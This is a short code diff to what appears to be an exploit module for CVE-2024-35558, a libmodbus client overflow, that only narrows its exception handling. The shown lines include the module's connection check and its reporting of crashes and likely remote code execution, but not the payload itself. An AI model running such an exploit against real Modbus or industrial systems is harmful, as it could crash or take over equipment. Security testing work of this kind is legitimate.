@@ -59,7 +59,7 @@ class Exploit(Exploit):
             s.connect((self.target, self.port))
             s.close()
             return True
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -132,12 +132,12 @@ class Exploit(Exploit):
                         print_success("[CVE-2024-35558] Client disconnected after overflow - crash/RCE likely triggered!")
                     else:
                         print_info(f"[CVE-2024-35558] Client still alive: {client_resp.hex()[:32]}")
-                except Exception:
+                except OSError:
                     print_success("[CVE-2024-35558] Client connection lost after overflow - exploitation indicator")
             conn.close()
         except TimeoutError:
             print_warning("[CVE-2024-35558] No client connected within 30s - ensure target uses libmodbus < 3.1.10 as client")
-        except Exception as exc:
+        except OSError as exc:
             print_error(f"[CVE-2024-35558] Error: {exc}")
         finally:
             srv.close()
